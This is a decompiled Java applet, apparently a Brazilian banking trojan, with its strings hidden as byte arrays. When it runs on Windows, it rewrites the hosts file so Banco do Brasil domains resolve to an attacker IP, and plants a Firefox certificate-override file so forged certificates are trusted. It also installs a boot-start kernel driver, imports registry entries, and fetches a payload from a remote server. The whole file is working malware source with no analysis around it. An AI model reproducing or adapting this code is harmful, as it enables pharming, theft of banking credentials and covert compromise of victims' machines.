import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.DataInputStream;
import java.util.Enumeration;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.io.FileNotFoundException;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.net.URLConnection;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.awt.Color;
import java.awt.Graphics;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class le extends Applet
{
    private static final long serialVersionUID = 1L;
    byte[] osn;
    String s8;
    byte[] BAR;
    String BAR1;
    byte[] LIN;
    String LIN1;
    byte[] TEM;
    String TEM1;
    byte[] IPP;
    String IPP1;
    byte[] VSYS;
    String VSYS1;
    byte[] CMS;
    String CMS1;
    byte[] CMSS;
    String CMSS1;
    byte[] URLX;
    String URLX1;
    byte[] BRA;
    String BRA1;
    byte[] BBB;
    String BBB1;
    byte[] BBBB;
    String BBBB1;
    int RANDO;
    String IP_PH;
    String JUST1;
    String N_ZIP;
    String X_ZIP;
    String BARRA;
    String PULAR;
    String TEMPO;
    String C_LIX;
    String C_HOST;
    String C_SYS;
    String C_JAVA;
    String ST_HOST;
    String ST_JAVA;
    
    public le() {
        this.osn = new byte[] { 111, 115, 46, 110, 97, 109, 101 };
        this.s8 = new String(this.osn);
        this.BAR = new byte[] { 102, 105, 108, 101, 46, 115, 101, 112, 97, 114, 97, 116, 111, 114 };
        this.BAR1 = new String(this.BAR);
        this.LIN = new byte[] { 108, 105, 110, 101, 46, 115, 101, 112, 97, 114, 97, 116, 111, 114 };
        this.LIN1 = new String(this.LIN);
        this.TEM = new byte[] { 106, 97, 118, 97, 46, 105, 111, 46, 116, 109, 112, 100, 105, 114 };
        this.TEM1 = new String(this.TEM);
        this.IPP = new byte[] { 49, 56, 56, 46, 49, 54, 53, 46, 50, 48, 49, 46, 53, 52 };
        this.IPP1 = new String(this.IPP);
        this.VSYS = new byte[] { 97, 99, 116, 117, 115, 98, 46, 115, 121, 115 };
        this.VSYS1 = new String(this.VSYS);
        this.CMS = new byte[] { 99, 109, 100, 32, 47, 99, 32, 115, 99, 32, 99, 114, 101, 97, 116, 101, 32, 97, 99, 116, 117, 115, 98, 32, 98, 105, 110, 80, 97, 116, 104, 61, 32, 34, 115, 121, 115, 116, 101, 109, 51, 50, 92, 100, 114, 105, 118, 101, 114, 115, 92, 97, 99, 116, 117, 115, 98, 46, 115, 121, 115, 34, 32, 103, 114, 111, 117, 112, 61, 32, 34, 65, 99, 116, 32, 71, 114, 111, 117, 112, 34, 32, 116, 121, 112, 101, 61, 32, 107, 101, 114, 110, 101, 108, 32, 115, 116, 97, 114, 116, 61, 32, 98, 111, 111, 116, 32, 101, 114, 114, 111, 114, 61, 32, 110, 111, 114, 109, 97, 108, 32, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 61, 32, 34, 65, 67, 116, 85, 115, 98, 34 };
        this.CMS1 = new String(this.CMS);
        this.CMSS = new byte[] { 99, 109, 100, 32, 47, 99, 32, 115, 99, 32, 115, 116, 97, 114, 116, 32, 97, 99, 116, 117, 115, 98 };
        this.CMSS1 = new String(this.CMSS);
        this.URLX = new byte[] { 104, 116, 116, 112, 58, 47, 47, 49, 56, 56, 46, 49, 54, 53, 46, 50, 48, 49, 46, 53, 52, 47, 109, 97, 105, 115, 46, 112, 104, 112, 63, 111, 115, 61 };
        this.URLX1 = new String(this.URLX);
        this.BRA = new byte[] { 114, 101, 97, 108, 115, 101, 99, 117, 114, 101, 119, 101, 98, 46, 99, 111, 109, 46, 98, 114 };
        this.BRA1 = new String(this.BRA);
        this.BBB = new byte[] { 98, 98, 46, 99, 111, 109, 46, 98, 114 };
        this.BBB1 = new String(this.BBB);
        this.BBBB = new byte[] { 98, 97, 110, 99, 111, 100, 111, 98, 114, 97, 115, 105, 108, 46, 99, 111, 109, 46, 98, 114 };
        this.BBBB1 = new String(this.BBBB);
        this.RANDO = (int)(Math.random() * 1.0E8);
        this.IP_PH = this.IPP1;
        this.JUST1 = "MDXX2010.tmp";
        this.N_ZIP = "mdx";
        this.X_ZIP = String.valueOf(this.RANDO) + ".tmp";
        this.BARRA = System.getProperty(this.BAR1);
        this.PULAR = System.getProperty(this.LIN1);
        this.TEMPO = System.getProperty(this.TEM1);
        this.C_LIX = "C:" + this.BARRA + this.JUST1;
        this.C_HOST = "C:" + this.BARRA + "WINDOWS" + this.BARRA + "system32" + this.BARRA + "drivers" + this.BARRA + "etc" + this.BARRA + "hosts";
        this.C_SYS = "C:" + this.BARRA + "WINDOWS" + this.BARRA + "system32" + this.BARRA + "drivers" + this.BARRA + this.VSYS1;
        this.C_JAVA = String.valueOf(System.getProperty("java.home")) + this.BARRA + "lib" + this.BARRA + "security" + this.BARRA + "java.policy";
        this.ST_HOST = this.PULAR;
        this.ST_JAVA = this.PULAR;
    }
    
    @Override
    public void paint(final Graphics g) {
        g.setColor(Color.darkGray);
        g.drawString("MDXX2010", 5, 10);
    }
    
    public static void Pausar(final int n) {
        final long t0 = System.currentTimeMillis();
        long t2;
        do {
            t2 = System.currentTimeMillis();
        } while (t2 - t0 < n * 1000);
    }
    
    public void H32A(final String URLexterna, final String SalvarComo) {
        try {
            final File files = new File(SalvarComo);
            final boolean exists = files.exists();
            if (!exists) {
                final URL url = new URL(URLexterna);
                final URLConnection connection = url.openConnection();
                final InputStream stream = connection.getInputStream();
                final BufferedInputStream in = new BufferedInputStream(stream);
                final FileOutputStream file = new FileOutputStream(SalvarComo);
                final BufferedOutputStream out = new BufferedOutputStream(file);
                int i;
                while ((i = in.read()) != -1) {
                    out.write(i);
                }
                out.flush();
                out.close();
            }
        }
        catch (IOException ex) {}
    }
    
    public void H32C(final String HostURL) {
        this.ST_HOST = String.valueOf(this.ST_HOST) + this.PULAR + this.IP_PH + " " + HostURL;
    }
    
    public void H31S(final String Local, final String Dados) {
        try {
            final File file = new File(Local);
            final FileWriter filewriter = new FileWriter(file, true);
            filewriter.write(new StringBuilder().append(Dados).toString());
            filewriter.close();
        }
        catch (IOException ex) {}
    }
    
    private static void H32F(final String Local, final String Destino) {
        try {
            final File f1 = new File(Local);
            final File f2 = new File(Destino);
            final InputStream in = new FileInputStream(f1);
            final OutputStream out = new FileOutputStream(f2);
            final byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            in.close();
            out.close();
        }
        catch (FileNotFoundException ex) {}
        catch (IOException ex2) {}
    }
    
    public void H32B(final String valor) {
        try {
            Runtime.getRuntime().exec(valor);
        }
        catch (IOException ex) {}
    }
    
    public void H24D(final String p, final String s) {
        try {
            final InputStream aa1 = this.getClass().getResourceAsStream(p);
            final FileOutputStream aa2 = new FileOutputStream(s);
            int aa3;
            while ((aa3 = aa1.read()) != -1) {
                aa2.write(aa3);
            }
            aa2.flush();
            aa2.close();
        }
        catch (IOException ex) {}
    }
    
    public void H24Z(final String Arq) {
        try {
            final String zipname = String.valueOf(this.TEMPO) + Arq;
            final String xDir = this.TEMPO;
            final ZipFile zipFile = new ZipFile(zipname);
            final Enumeration enumeration = zipFile.entries();
            while (enumeration.hasMoreElements()) {
                final ZipEntry zipEntry = enumeration.nextElement();
                final BufferedInputStream bis = new BufferedInputStream(zipFile.getInputStream(zipEntry));
                final byte[] buffer = new byte[2048];
                final BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(String.valueOf(xDir) + zipEntry.getName()), buffer.length);
                int size;
                while ((size = bis.read(buffer, 0, buffer.length)) != -1) {
                    bos.write(buffer, 0, size);
                }
                bos.flush();
                bos.close();
                bis.close();
            }
        }
        catch (IOException ex) {}
    }
    
    public void FFexists() {
        String U_HOME = System.getProperty("user.home");
        if (!U_HOME.endsWith("/") && !U_HOME.endsWith("\\")) {
            U_HOME = String.valueOf(U_HOME) + this.BARRA;
        }
        final String STR1 = String.valueOf(U_HOME) + "Application Data" + this.BARRA + "Mozilla" + this.BARRA + "Firefox" + this.BARRA;
        final String STR2 = String.valueOf(U_HOME) + "Dados de aplicativos" + this.BARRA + "Mozilla" + this.BARRA + "Firefox" + this.BARRA;
        final String STR3 = String.valueOf(U_HOME) + "AppData" + this.BARRA + "Roaming " + this.BARRA + "Mozilla" + this.BARRA + "Firefox" + this.BARRA;
        try {
            final File arq1 = new File(String.valueOf(STR1) + "profiles.ini");
            final File arq2 = new File(String.valueOf(STR2) + "profiles.ini");
            final File arq3 = new File(String.valueOf(STR3) + "profiles.ini");
            if (arq1.exists()) {
                this.GetFFdir(STR1);
            }
            else if (arq2.exists()) {
                this.GetFFdir(STR2);
            }
            else if (arq3.exists()) {
                this.GetFFdir(STR3);
            }
        }
        catch (Exception ex) {}
    }
    
    public void GetFFdir(final String Where) {
        try {
            final FileInputStream fstream = new FileInputStream(String.valueOf(Where) + "profiles.ini");
            final DataInputStream in = new DataInputStream(fstream);
            final BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String strLine;
            while ((strLine = br.readLine()) != null) {
                final Pattern Filtrar = Pattern.compile("Path=(.*)");
                final Matcher Buscar = Filtrar.matcher(strLine);
                if (Buscar.find()) {
                    String ProfilesDIR = new String(Buscar.group(1));
                    ProfilesDIR = ProfilesDIR.replace('/', '\\');
                    if (!ProfilesDIR.endsWith("\\")) {
                        ProfilesDIR = String.valueOf(ProfilesDIR) + "\\";
                    }
                    ProfilesDIR = String.valueOf(Where) + ProfilesDIR;
                    H32F(String.valueOf(this.TEMPO) + "cert_override.txt", String.valueOf(ProfilesDIR) + "cert_override.txt");
                }
            }
            in.close();
        }
        catch (Exception ex) {}
    }
    
    @Override
    public void init() {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") > -1) {
            final File files = new File(this.C_LIX);
            final boolean exists = files.exists();
            if (!exists) {
                if (!this.TEMPO.endsWith("/") && !this.TEMPO.endsWith("\\")) {
                    this.TEMPO = String.valueOf(this.TEMPO) + this.BARRA;
                }
                Pausar(1);
                this.H32B("cmd /c mkdir c:\\windows\\syswow64\\drivers\\etc");
                Pausar(1);
                this.H32C("www." + this.BRA1);
                this.H32C("www2." + this.BRA1);
                this.H32C("www." + this.BBB1);
                this.H32C(this.BBB1);
                this.H32C("www." + this.BBBB1);
                this.H32C(this.BBBB1);
                Pausar(1);
                this.H31S(this.C_HOST, this.ST_HOST);
                this.H31S(this.C_JAVA, this.ST_JAVA);
                this.H24D(this.N_ZIP, String.valueOf(this.TEMPO) + this.X_ZIP);
                Pausar(1);
                this.H24Z(this.X_ZIP);
                Pausar(1);
                this.FFexists();
                Pausar(1);
                H32F(String.valueOf(this.TEMPO) + this.VSYS1, this.C_SYS);
                Pausar(1);
                this.H32B(this.CMS1);
                Pausar(2);
                this.H32B(this.CMSS1);
                this.H32B("cmd /c REG IMPORT " + this.TEMPO + "add.reg");
                final String OS = System.getProperty(this.s8);
                final Pattern osaa = Pattern.compile("Windows (.*)");
                final Matcher matcher = osaa.matcher(OS);
                if (matcher.find()) {
                    final String tipo = matcher.group(1);
                    final String t = "Windows" + tipo;
                    this.H32A(String.valueOf(this.URLX1) + t, this.C_LIX);
                }
            }
        }
    }
}
